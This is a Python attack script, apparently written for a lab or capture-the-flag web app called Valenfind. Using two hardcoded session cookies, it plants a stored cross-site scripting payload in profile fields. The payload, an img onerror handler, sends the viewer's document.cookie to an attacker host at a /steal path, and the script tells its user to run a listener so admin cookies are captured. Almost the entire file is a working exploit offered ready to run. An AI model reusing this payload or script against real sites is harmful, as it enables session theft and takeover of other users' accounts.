#!/usr/bin/env python3
"""Valenfind stored-XSS seed script (no parameters).

Run it as-is:
  python owasp_hunt/valenfind_xss_seed.py

It submits a cookie-exfiltration payload into profile fields for two known sessions.
"""

from __future__ import annotations

import html
import random
import re
import string
from typing import Dict, List, Tuple

import requests


BASE_URL = "http://10.112.165.127:5000"
COOKIE_NAME = "session"
COOKIE_VALUES = [
    "eyJsaWtlZCI6W10sInVzZXJfaWQiOjksInVzZXJuYW1lIjoiMTIzIn0.aeFLFA.efdhJ78NfiztsKIzas2UVa5PXzw",
    ".eJwljEEKwjAUBa_yfesiqCu78wbupZRP-qrBpCn5yaKU3t2Aq5nZzI5xDmofGvrXDikNiDTTN9Hh4VyqSxGXqYXTSZ6BahSX4hpYKFuqWdacZh94xnAMHYL_cmqbptWYR9_i_vdFI9Hjcr3h-AEITyjz.aeFLFA.qlotgrsCHcBudjmxf4eS5QO9y1A",
]
ATTACKER_HOST = "10.112.69.178"
ATTACKER_PORT = 8000
TIMEOUT = 12


def marker() -> str:
    return "VFSEED_" + "".join(random.choices(string.ascii_uppercase + string.digits, k=6))


def parse_fields_and_hidden_inputs(body: str) -> Tuple[List[str], Dict[str, str]]:
    fields: List[str] = []
    hidden: Dict[str, str] = {}

    for m in re.finditer(r"<input[^>]*>", body, flags=re.I):
        tag = m.group(0)
        name_m = re.search(r"name\s*=\s*['\"]([^'\"]+)['\"]", tag, flags=re.I)
        if not name_m:
            continue
        name = name_m.group(1)
        fields.append(name)

        type_m = re.search(r"type\s*=\s*['\"]([^'\"]+)['\"]", tag, flags=re.I)
        if type_m and type_m.group(1).lower() == "hidden":
            value_m = re.search(r"value\s*=\s*['\"]([^'\"]*)['\"]", tag, flags=re.I)
            hidden[name] = value_m.group(1) if value_m else ""

    for m in re.finditer(r"<textarea[^>]*>", body, flags=re.I):
        tag = m.group(0)
        name_m = re.search(r"name\s*=\s*['\"]([^'\"]+)['\"]", tag, flags=re.I)
        if name_m:
            fields.append(name_m.group(1))

    dedup: List[str] = []
    seen = set()
    for f in fields:
        if f not in seen:
            seen.add(f)
            dedup.append(f)

    return dedup, hidden


def build_payload() -> str:
    # Keep payload compact and resilient across basic filters.
    return (
        "<img src=x onerror=\""
        "(new Image).src='http://"
        + ATTACKER_HOST
        + ":"
        + str(ATTACKER_PORT)
        + "/steal?d='+encodeURIComponent(document.cookie)"
        "\">"
    )


def build_profile_data(fields: List[str], hidden: Dict[str, str], payload: str, mk: str) -> Dict[str, str]:
    data = dict(hidden)

    if not fields:
        fields = ["real_name", "email", "phone", "home_address", "bio"]

    for name in fields:
        if name in hidden:
            continue
        nl = name.lower()
        if "mail" in nl:
            data[name] = f"{mk.lower()}@example.com"
        elif "phone" in nl or "tel" in nl:
            data[name] = "123456789"
        else:
            data[name] = f"{payload} {mk}"

    return data


def visible_text(html_body: str) -> str:
    no_script = re.sub(r"<script\b[^<]*(?:(?!</script>)<[^<]*)*</script>", "", html_body, flags=re.I)
    stripped = re.sub(r"<[^>]+>", " ", no_script)
    return html.unescape(re.sub(r"\s+", " ", stripped)).strip()


def seed_one(cookie_value: str, label: str) -> None:
    s = requests.Session()
    s.cookies.set(COOKIE_NAME, cookie_value)

    complete_url = f"{BASE_URL}/complete_profile"
    profile_url = f"{BASE_URL}/my_profile"

    r0 = s.get(complete_url, timeout=TIMEOUT, allow_redirects=True)
    fields, hidden = parse_fields_and_hidden_inputs(r0.text)

    p = build_payload()
    mk = marker()
    data = build_profile_data(fields, hidden, p, mk)

    rp = s.post(complete_url, data=data, timeout=TIMEOUT, allow_redirects=True)
    rg = s.get(profile_url, timeout=TIMEOUT, allow_redirects=True)

    reflected_raw = "<img" in rg.text.lower() or "onerror" in rg.text.lower()
    reflected_marker = mk in rg.text or mk in visible_text(rg.text)

    print(f"[{label}] GET /complete_profile -> {r0.status_code}")
    print(f"[{label}] POST /complete_profile -> {rp.status_code}")
    print(f"[{label}] GET /my_profile -> {rg.status_code}")
    print(f"[{label}] marker reflected -> {reflected_marker}")
    print(f"[{label}] raw html reflected -> {reflected_raw}")
    print(f"[{label}] payload snippet -> {p[:80]}...")
    print("-" * 72)


def main() -> None:
    print("Valenfind XSS seed started")
    print(f"Target       : {BASE_URL}")
    print(f"Callback URL : http://{ATTACKER_HOST}:{ATTACKER_PORT}/steal?d=...")
    print("Make sure your listener on attacker host is running.")
    print("=" * 72)

    for i, cookie_value in enumerate(COOKIE_VALUES, start=1):
        seed_one(cookie_value, f"cookie-{i}")

    print("Done. If admin/mod views your profile content, cookie exfil may fire.")


if __name__ == "__main__":
    main()
